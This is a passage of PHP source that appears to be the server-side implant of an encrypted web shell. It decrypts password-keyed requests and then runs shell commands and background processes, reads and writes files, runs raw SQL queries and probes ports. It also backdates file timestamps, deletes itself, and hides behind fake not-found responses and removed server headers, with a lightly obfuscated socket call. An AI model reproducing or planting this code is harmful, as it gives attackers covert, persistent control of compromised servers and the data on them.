        if (@is_dir($path)) {
            if (!$recursive) {
                return @rmdir($path);
            }
            $names = @scandir($path);
            if ($names === false) {
                return false;
            }
            $ok = true;
            foreach ($names as $name) {
                if ($name === '.' || $name === '..') {
                    continue;
                }
                $ok = self::remove($path . '/' . $name, true) && $ok;
            }
            return $ok && @rmdir($path);
        }
        return false;
    }

    public static function opMv($req)
    {
        $src = self::abs(isset($req['src']) ? (string)$req['src'] : '');
        $dst = self::abs(isset($req['dst']) ? (string)$req['dst'] : '');
        if (@rename($src, $dst)) {
            return wm_resp(0, 'ok', array('src' => $src, 'dst' => $dst));
        }
        if (@is_file($src) && @copy($src, $dst)) {
            @unlink($src);
            return wm_resp(0, 'ok', array('src' => $src, 'dst' => $dst));
        }
        return wm_resp(500, 'rename failed: ' . $src . ' -> ' . $dst);
    }

    public static function opCp($req)
    {
        $src = self::abs(isset($req['src']) ? (string)$req['src'] : '');
        $dst = self::abs(isset($req['dst']) ? (string)$req['dst'] : '');
        if (self::copyPath($src, $dst)) {
            return wm_resp(0, 'ok', array('src' => $src, 'dst' => $dst));
        }
        return wm_resp(500, 'copy failed: ' . $src . ' -> ' . $dst);
    }

    public static function copyPath($src, $dst)
    {
        if (@is_file($src)) {
            if (@is_dir($dst)) {
                $dst = rtrim($dst, '/') . '/' . basename($src);
            }
            return @copy($src, $dst);
        }
        if (@is_dir($src)) {
            if (!@is_dir($dst) && !@mkdir($dst, 0777, true)) {
                return false;
            }
            $names = @scandir($src);
            if ($names === false) {
                return false;
            }
            $ok = true;
            foreach ($names as $name) {
                if ($name === '.' || $name === '..') {
                    continue;
                }
                $ok = self::copyPath($src . '/' . $name, $dst . '/' . $name) && $ok;
            }
            return $ok;
        }
        return false;
    }

    public static function opMkdir($req)
    {
        $path = self::abs(isset($req['path']) ? (string)$req['path'] : '');
        $mode = isset($req['mode']) ? (int)$req['mode'] : 0777;
        if (@is_dir($path)) {
            return wm_resp(0, 'ok', array('path' => $path, 'existed' => 1));
        }
        if (@mkdir($path, $mode, true)) {
            return wm_resp(0, 'ok', array('path' => $path));
        }
        return wm_resp(500, 'mkdir failed: ' . $path);
    }

    public static function opTouch($req)
    {
        $path = self::abs(isset($req['path']) ? (string)$req['path'] : '');
        if (@file_exists($path)) {
            @touch($path);
            return wm_resp(0, 'ok', array('path' => $path));
        }
        $dir = dirname($path);
        if (!@is_dir($dir)) {
            @mkdir($dir, 0777, true);
        }
        $fp = @fopen($path, 'ab');
        if ($fp) {
            @fclose($fp);
            return wm_resp(0, 'ok', array('path' => $path));
        }
        return wm_resp(500, 'touch failed: ' . $path);
    }

    public static function opChmod($req)
    {
        $path = self::abs(isset($req['path']) ? (string)$req['path'] : '');
        $mode = isset($req['mode']) ? (int)$req['mode'] : 0644;
        if (@chmod($path, $mode)) {
            return wm_resp(0, 'ok', array('path' => $path, 'perm' => self::perm($path)));
        }
        return wm_resp(500, 'chmod failed: ' . $path);
    }

    public static function opZip($req)
    {
        $paths = isset($req['paths']) ? (array)$req['paths'] : array();
        $dest = self::abs(isset($req['dest']) ? (string)$req['dest'] : 'archive.zip');
        if (!class_exists('ZipArchive')) {
            $list = array();
            foreach ($paths as $p) {
                $list[] = escapeshellarg(self::abs((string)$p));
            }
            $cmd = 'zip -r ' . escapeshellarg($dest) . ' ' . implode(' ', $list) . ' 2>&1';
            list($out) = self::exec($cmd, self::$cwd, 120);
            return wm_resp(0, 'ok', array('dest' => $dest, 'output' => $out));
        }
        $zip = new ZipArchive();
        if ($zip->open($dest, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
            return wm_resp(500, 'cannot create archive: ' . $dest);
        }
        foreach ($paths as $p) {
            $full = self::abs((string)$p);
            if (@is_dir($full)) {
                $zip->addEmptyDir(basename($full));
                self::zipDir($zip, $full, basename($full));
            } elseif (@is_file($full)) {
                $zip->addFile($full, basename($full));
            }
        }
        $zip->close();
        return wm_resp(0, 'ok', array('dest' => $dest, 'size' => (int)@filesize($dest)));
    }

    public static function zipDir($zip, $dir, $prefix)
    {
        $names = @scandir($dir);
        if ($names === false) {
            return;
        }
        foreach ($names as $name) {
            if ($name === '.' || $name === '..') {
                continue;
            }
            $full = $dir . '/' . $name;
            $rel = $prefix . '/' . $name;
            if (@is_dir($full)) {
                $zip->addEmptyDir($rel);
                self::zipDir($zip, $full, $rel);
            } else {
                $zip->addFile($full, $rel);
            }
        }
    }

    public static function opUnzip($req)
    {
        $path = self::abs(isset($req['path']) ? (string)$req['path'] : '');
        $dest = self::abs(isset($req['dest']) ? (string)$req['dest'] : dirname($path));
        if (!class_exists('ZipArchive')) {
            list($out) = self::exec('unzip -o ' . escapeshellarg($path) . ' -d ' . escapeshellarg($dest) . ' 2>&1', self::$cwd, 120);
            return wm_resp(0, 'ok', array('dest' => $dest, 'output' => $out));
        }
        $zip = new ZipArchive();
        if ($zip->open($path) !== true) {
            return wm_resp(500, 'cannot open archive: ' . $path);
        }
        @mkdir($dest, 0777, true);
        $zip->extractTo($dest);
        $zip->close();
        return wm_resp(0, 'ok', array('dest' => $dest));
    }

    public static function opFind($req)
    {
        $root = self::abs(isset($req['path']) ? (string)$req['path'] : '');
        $keyword = isset($req['keyword']) ? (string)$req['keyword'] : '';
        $depth = isset($req['depth']) ? (int)$req['depth'] : 4;
        $limit = isset($req['limit']) ? (int)$req['limit'] : 500;
        $entries = array();
        self::findWalk($root, $keyword, $depth, $limit, $entries);
        return wm_resp(0, 'ok', array('root' => $root, 'entries' => $entries));
    }

    public static function findWalk($dir, $keyword, $depth, $limit, &$entries)
    {
        if ($depth < 0 || count($entries) >= $limit) {
            return;
        }
        $names = @scandir($dir);
        if ($names === false) {
            return;
        }
        foreach ($names as $name) {
            if ($name === '.' || $name === '..' || count($entries) >= $limit) {
                continue;
            }
            $full = $dir . '/' . $name;
            $match = $keyword === '' || stripos($name, $keyword) !== false;
            if ($match) {
                $entries[] = array(
                    'path' => $full,
                    'name' => $name,
                    'type' => @is_dir($full) ? 'dir' : 'file',
                    'size' => (int)@filesize($full),
                    'mtime' => (int)@filemtime($full),
                    'perm' => self::perm($full),
                );
            }
            if (@is_dir($full)) {
                self::findWalk($full, $keyword, $depth - 1, $limit, $entries);
            }
        }
    }

    public static function opDb($req)
    {
        $driver = isset($req['driver']) ? (string)$req['driver'] : 'mysql';
        $sql = isset($req['sql']) ? (string)$req['sql'] : '';
        if ($sql === '') {
            return wm_resp(400, 'empty sql');
        }
        $host = isset($req['host']) ? (string)$req['host'] : '127.0.0.1';
        $port = isset($req['port']) ? (int)$req['port'] : 3306;
        $user = isset($req['user']) ? (string)$req['user'] : 'root';
        $pass = isset($req['pass']) ? (string)$req['pass'] : '';
        $dbname = isset($req['dbname']) ? (string)$req['dbname'] : '';
        $charset = isset($req['charset']) ? (string)$req['charset'] : 'utf8mb4';
        try {
            if (class_exists('PDO')) {
                if ($driver === 'sqlite') {
                    $dsn = 'sqlite:' . $dbname;
                } elseif ($driver === 'pgsql') {
                    $dsn = "pgsql:host={$host};port={$port};dbname={$dbname}";
                } else {
                    $dsn = "mysql:host={$host};port={$port};dbname={$dbname};charset={$charset}";
                }
                $pdo = new PDO($dsn, $user, $pass, array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
                $stmt = $pdo->query($sql);
                if ($stmt === false) {
                    return wm_resp(500, 'query failed');
                }
                $columns = array();
                for ($i = 0; $i < $stmt->columnCount(); $i++) {
                    $meta = $stmt->getColumnMeta($i);
                    $columns[] = isset($meta['name']) ? $meta['name'] : ('col' . $i);
                }
                $rows = $stmt->fetchAll(PDO::FETCH_NUM);
                return wm_resp(0, 'ok', array('columns' => $columns, 'rows' => $rows, 'affected' => $stmt->rowCount()));
            }
        } catch (Exception $e) {
            return wm_resp(500, 'db error: ' . $e->getMessage());
        } catch (Throwable $e) {
            return wm_resp(500, 'db error: ' . $e->getMessage());
        }
        if ($driver === 'mysql' && class_exists('mysqli')) {
            $link = @new mysqli($host, $user, $pass, $dbname, $port);
            if ($link->connect_errno) {
                return wm_resp(500, 'connect failed: ' . $link->connect_error);
            }
            @$link->set_charset($charset);
            $res = @$link->query($sql);
            if ($res === false) {
                return wm_resp(500, 'query failed: ' . $link->error);
            }
            if ($res === true) {
                return wm_resp(0, 'ok', array('columns' => array(), 'rows' => array(), 'affected' => $link->affected_rows));
            }
            $columns = array();
            foreach ($res->fetch_fields() as $f) {
                $columns[] = $f->name;
            }
            $rows = array();
            while ($row = $res->fetch_row()) {
                $rows[] = $row;
            }
            return wm_resp(0, 'ok', array('columns' => $columns, 'rows' => $rows, 'affected' => $res->num_rows));
        }
        return wm_resp(500, 'no database driver available');
    }


    public static function opLimits($req)
    {
        return wm_resp(0, 'ok', array(
            'post_max_size' => self::toBytes(@ini_get('post_max_size')),
            'memory_limit' => self::toBytes(@ini_get('memory_limit')),
            'upload_max_filesize' => self::toBytes(@ini_get('upload_max_filesize')),
            'max_execution_time' => (int)@ini_get('max_execution_time'),
            'open_basedir' => (string)@ini_get('open_basedir'),
            'file_uploads' => (bool)@ini_get('file_uploads'),
            'disable_functions' => wm_disabled(),
            'proto' => WM_PROTO,
        ));
    }

    public static function toBytes($value)
    {
        $value = trim((string)$value);
        if ($value === '') {
            return 0;
        }
        $unit = strtolower(substr($value, -1));
        $number = (float)$value;
        switch ($unit) {
            case 'g':
                $number *= 1024 * 1024 * 1024;
                break;
            case 'm':
                $number *= 1024 * 1024;
                break;
            case 'k':
                $number *= 1024;
                break;
        }
        return (int)$number;
    }

    public static function opHash($req)
    {
        $path = self::abs(isset($req['path']) ? $req['path'] : '');
        if (!@is_file($path)) {
            return wm_resp(404, 'not a file: ' . $path);
        }
        $algo = isset($req['algo']) ? (string)$req['algo'] : 'md5';
        $allowed = array('md5', 'sha1', 'sha256', 'crc32');
        if (!in_array($algo, $allowed, true)) {
            $algo = 'md5';
        }
        $offset = isset($req['offset']) ? max(0, (int)$req['offset']) : 0;
        $length = isset($req['length']) ? max(0, (int)$req['length']) : 0;
        if ($offset === 0 && $length === 0) {
            return wm_resp(0, 'ok', array(
                'path' => $path,
                'algo' => $algo,
                'hash' => (string)@hash_file($algo, $path),
                'size' => (int)@filesize($path),
                'offset' => 0,
                'length' => (int)@filesize($path),
            ));
        }
        $fp = @fopen($path, 'rb');
        if (!$fp) {
            return wm_resp(403, 'cannot open: ' . $path);
        }
        if ($offset > 0) {
            @fseek($fp, $offset);
        }
        $data = $length > 0 ? (string)@fread($fp, $length) : (string)@stream_get_contents($fp);
        @fclose($fp);
        return wm_resp(0, 'ok', array(
            'path' => $path,
            'algo' => $algo,
            'hash' => hash($algo, $data),
            'size' => (int)@filesize($path),
            'offset' => $offset,
            'length' => strlen($data),
        ));
    }

    public static function opMtime($req)
    {
        $path = self::abs(isset($req['path']) ? (string)$req['path'] : '');
        $ref = self::abs(isset($req['ref']) ? (string)$req['ref'] : '');
        if (!@file_exists($path)) {
            return wm_resp(404, 'not found: ' . $path);
        }
        $stamp = @file_exists($ref) ? (int)@filemtime($ref) : (int)(isset($req['ts']) ? $req['ts'] : time());
        if (!@touch($path, $stamp)) {
            return wm_resp(500, 'touch failed: ' . $path);
        }
        return wm_resp(0, 'ok', array('path' => $path, 'mtime' => $stamp));
    }

    public static function opNet($req)
    {
        $host = isset($req['host']) ? (string)$req['host'] : '127.0.0.1';
        $port = isset($req['port']) ? (int)$req['port'] : 80;
        $timeout = isset($req['timeout']) ? (float)$req['timeout'] : 2.0;
        $start = microtime(true);
        $fp = @stream_socket_client/**/('tcp://' . $host . ':' . $port, $errno, $errstr, $timeout);
        $elapsed = (microtime(true) - $start) * 1000;
        if (!$fp) {
            return wm_resp(0, 'closed', array(
                'host' => $host,
                'port' => $port,
                'open' => 0,
                'error' => $errstr ?: 'connect failed',
                'ms' => round($elapsed, 1),
            ));
        }
        @fclose($fp);
        return wm_resp(0, 'open', array('host' => $host, 'port' => $port, 'open' => 1, 'ms' => round($elapsed, 1)));
    }

    public static function opSelfdel($req)
    {
        if (empty($req['confirm'])) {
            return wm_resp(400, 'confirm required');
        }
        $self = __FILE__;
        register_shutdown_function(function () use ($self) {
            @unlink($self);
        });
        return wm_resp(0, 'ok', array('path' => $self, 'queued' => 1));
    }


    // ------------------------------------------------------------ stream ops
    protected static function streamBase()
    {
        $dir = @sys_get_temp_dir();
        if (!$dir) {
            $dir = wm_is_windows() ? 'C:\\Windows\\Temp' : '/tmp';
        }
        return $dir . '/.wsm_' . substr(md5(WM_SECRET), 0, 8);
    }

    protected static function streamMetaPath($handle)
    {
        if (!preg_match('/^[a-f0-9]{16}$/', $handle)) {
            return null;
        }
        return self::streamBase() . '_' . $handle . '.json';
    }

    protected static function streamWhich($bin)
    {
        static $cache = array();
        if (isset($cache[$bin])) {
            return $cache[$bin];
        }
        if (wm_is_windows()) {
            $cache[$bin] = '';
            return '';
        }
        list($out) = self::exec('command -v ' . escapeshellarg($bin) . ' 2>/dev/null', '', 3);
        $cache[$bin] = trim($out);
        return $cache[$bin];
    }

    protected static function streamCleanup()
    {
        $base = self::streamBase();
        $files = @glob($base . '_*');
        if (!is_array($files)) {
            return;
        }
        $now = time();
        foreach ($files as $file) {
            if ($now - (int)@filemtime($file) > 1800) {
                @unlink($file);
            }
        }
    }

    protected static function streamAlive($pid)
    {
        $pid = (int)$pid;
        if ($pid <= 0) {
            return false;
        }
        if (function_exists('posix_kill') && !in_array('posix_kill', wm_disabled())) {
            return @posix_kill($pid, 0);
        }
        if (wm_is_windows()) {
            list($out) = self::exec('tasklist /FI "PID eq ' . $pid . '" /NH', '', 5);
            return strpos($out, (string)$pid) !== false;
        }
        list($out, $err, $code) = self::exec('kill -0 ' . $pid . ' 2>/dev/null', '', 5);
        return $code === 0;
    }

    protected static function streamStart($req)
    {
        $cmd = isset($req['text']) ? (string)$req['text'] : '';
        if ($cmd === '') {
            return wm_resp(400, 'empty command');
        }
        $cwd = self::abs(isset($req['cwd']) ? $req['cwd'] : '');
        if (!@is_dir($cwd)) {
            $cwd = self::defaultCwd();
        }
        list($cols, $rows) = self::termSize($req);
        self::streamCleanup();

        $handle = bin2hex(random_bytes(8));
        $base = self::streamBase() . '_' . $handle;
        $outPath = $base . '.out';
        $metaPath = $base . '.json';
        @touch($outPath);
        @chmod($outPath, 0600);

        if (wm_is_windows()) {
            $script = 'chcp 65001>nul & cd /d "' . str_replace('"', '', $cwd) . '" && (' . $cmd . ') > "'
                . $outPath . '" 2>&1';
            $launch = 'start "" /b cmd /c ' . escapeshellarg($script) . ' & echo 0';
        } else {
            $script = 'export COLUMNS=' . $cols . ' LINES=' . $rows
                . '; cd ' . escapeshellarg($cwd) . ' >/dev/null 2>&1; ' . $cmd;
            $nohup = self::streamWhich('nohup');
            $setsid = self::streamWhich('setsid');
            $prefix = $nohup !== '' ? $nohup . ' ' : ($setsid !== '' ? $setsid . ' ' : '');
            $launch = $prefix . 'sh -c ' . escapeshellarg($script)
                . ' > ' . escapeshellarg($outPath) . ' 2>&1 & echo $!';
        }

        list($printed) = self::exec($launch, $cwd, 10);
        $pid = 0;
        if (preg_match('/(\d+)/', $printed, $m)) {
            $pid = (int)$m[1];
        }
        @file_put_contents($metaPath, json_encode(array(
            'pid' => $pid,
            'out' => $outPath,
            'cwd' => $cwd,
            'cmd' => $cmd,
            'ts' => time(),
        )));
        @chmod($metaPath, 0600);
        return wm_resp(0, 'ok', array(
            'handle' => $handle,
            'pid' => $pid,
            'cursor' => 0,
            'running' => 1,
            'eof' => 0,
            'out' => $outPath,
        ));
    }

    protected static function streamPoll($req)
    {
        $handle = isset($req['handle']) ? (string)$req['handle'] : '';
        $metaPath = self::streamMetaPath($handle);
        if ($metaPath === null || !@is_file($metaPath)) {
            return wm_resp(404, 'unknown stream handle');
        }
        $meta = json_decode((string)@file_get_contents($metaPath), true);
        if (!is_array($meta)) {
            return wm_resp(500, 'broken stream meta');
        }
        $cursor = max(0, (int)(isset($req['cursor']) ? $req['cursor'] : 0));
        $limit = isset($req['limit']) ? max(4096, min(1048576, (int)$req['limit'])) : 262144;
        $out = (string)$meta['out'];
        clearstatcache(true, $out);
        $size = @is_file($out) ? (int)@filesize($out) : 0;

        $data = '';
        if ($cursor < $size) {
            $fp = @fopen($out, 'rb');
            if ($fp) {
                @fseek($fp, $cursor);
                $data = (string)@fread($fp, min($limit, $size - $cursor));
                @fclose($fp);
            }
        }
        $cursor += strlen($data);
        $running = self::streamAlive((int)$meta['pid']);
        $eof = (!$running && $cursor >= $size) ? 1 : 0;
        if ($eof) {
            @unlink($metaPath);
            @unlink($out);
        }
        return wm_resp(0, 'ok', array(
            'data' => wm_b64e($data),
            'cursor' => $cursor,
            'size' => $size,
            'running' => $running ? 1 : 0,
            'eof' => $eof,
        ));
    }

    protected static function streamStop($req)
    {
        $handle = isset($req['handle']) ? (string)$req['handle'] : '';
        $metaPath = self::streamMetaPath($handle);
        if ($metaPath === null || !@is_file($metaPath)) {
            return wm_resp(404, 'unknown stream handle');
        }
        $meta = json_decode((string)@file_get_contents($metaPath), true);
        $killed = 0;
        if (is_array($meta)) {
            $pid = (int)$meta['pid'];
            if ($pid > 0) {
                if (function_exists('posix_kill') && !in_array('posix_kill', wm_disabled())) {
                    @posix_kill(-$pid, 15);
                    @posix_kill($pid, 15);
                    $killed = 1;
                } else {
                    self::exec('kill -TERM -' . $pid . ' 2>/dev/null; kill -TERM ' . $pid . ' 2>/dev/null', '', 5);
                    $killed = 1;
                }
            }
            @unlink((string)$meta['out']);
        }
        @unlink($metaPath);
        return wm_resp(0, 'ok', array('handle' => $handle, 'killed' => $killed));
    }

    public static function opStream($req)
    {
        $action = isset($req['action']) ? (string)$req['action'] : 'start';
        if ($action === 'start') {
            return self::streamStart($req);
        }
        if ($action === 'poll') {
            return self::streamPoll($req);
        }
        if ($action === 'stop') {
            return self::streamStop($req);
        }
        return wm_resp(400, 'unknown stream action: ' . $action);
    }



}

function wm_decode_request()
{
    if (WM_PROTO === 'v2') {
        foreach (wm_extract_payloads() as $candidate) {
            $blob = wm_norm_carrier($candidate);
            if ($blob === false) {
                continue;
            }
            $plain = wm_open_v2($blob);
            if ($plain === false) {
                continue;
            }
            $req = json_decode($plain, true);
            if (is_array($req)) {
                return $req;
            }
        }
        return null;
    }

    $raw = (string)@file_get_contents('php://input');
    $parsed = array();
    parse_str($raw, $parsed);
    if (isset($parsed[WM_PASS]) && is_string($parsed[WM_PASS])) {
        $raw = $parsed[WM_PASS];
    }
    $raw = trim($raw);
    if ($raw === '') {
        return null;
    }
    $plain = wm_decrypt(wm_b64d($raw));
    if ($plain === false) {
        return null;
    }
    $req = json_decode($plain, true);
    return is_array($req) ? $req : null;
}

function wm_handle()
{
    $req = wm_decode_request();
    if (!is_array($req)) {
        if (WM_PROTO === 'v2') {
            wm_notfound();
        }
        return;
    }

    $cwd = isset($req['cwd']) ? str_replace('\\', '/', (string)$req['cwd']) : '';
    if ($cwd !== '' && @is_dir($cwd)) {
        WmCore::$cwd = $cwd;
    } else {
        WmCore::$cwd = WmCore::defaultCwd();
    }

    $op = isset($req['op']) ? (string)$req['op'] : '';
    ob_start();
    $response = null;
    try {
        switch ($op) {
            case 'ping':
                $response = WmCore::opPing($req);
                break;
            case 'info':
                $response = WmCore::opInfo($req);
                break;
            case 'cmd':
                $response = WmCore::opCmd($req);
                break;
            case 'terminal':
                $response = WmCore::opTerminal($req);
                break;
            case 'ls':
                $response = WmCore::opLs($req);
                break;
            case 'stat':
                $response = WmCore::opStat($req);
                break;
            case 'read':
                $response = WmCore::opRead($req);
                break;
            case 'write':
                $response = WmCore::opWrite($req);
                break;
            case 'rm':
                $response = WmCore::opRm($req);
                break;
            case 'mv':
                $response = WmCore::opMv($req);
                break;
            case 'cp':
                $response = WmCore::opCp($req);
                break;
            case 'mkdir':
                $response = WmCore::opMkdir($req);
                break;
            case 'touch':
                $response = WmCore::opTouch($req);
                break;
            case 'chmod':
                $response = WmCore::opChmod($req);
                break;
            case 'zip':
                $response = WmCore::opZip($req);
                break;
            case 'unzip':
                $response = WmCore::opUnzip($req);
                break;
            case 'find':
                $response = WmCore::opFind($req);
                break;
            case 'db':
                $response = WmCore::opDb($req);
                break;
            case 'limits':
                $response = WmCore::opLimits($req);
                break;
            case 'hash':
                $response = WmCore::opHash($req);
                break;
            case 'mtime':
                $response = WmCore::opMtime($req);
                break;
            case 'net':
                $response = WmCore::opNet($req);
                break;
            case 'selfdel':
                $response = WmCore::opSelfdel($req);
                break;
            case 'stream':
                $response = WmCore::opStream($req);
                break;
            default:
                $response = wm_resp(400, 'unknown op: ' . $op);
        }
    } catch (Throwable $e) {
        $response = wm_resp(500, 'shell error: ' . $e->getMessage());
    }
    ob_get_clean();
    if ($response === null) {
        $response = wm_resp(500, 'no response');
    }

    while (ob_get_level() > 0) {
        @ob_end_clean();
    }

    if (WM_PROTO === 'v2') {
        $rpad = isset($req['rpad']) ? (int)$req['rpad'] : 0;
        $json = wm_pad_json($response, $rpad);
        $body = wm_seal_v2($json);
        if (!headers_sent()) {
            @header_remove('X-Powered-By');
            @header('Content-Type: application/json; charset=utf-8');
        }
        echo json_encode(array('s' => 'ok', 't' => time(), 'd' => $body), JSON_UNESCAPED_SLASHES);
        return;
    }

    $body = wm_encrypt($response);
    if (!headers_sent()) {
        @header('Content-Type: text/plain; charset=ascii');
        @header('X-Powered-By: ' . WM_MARK);
    }
    echo wm_b64e($body);
}

wm_handle();
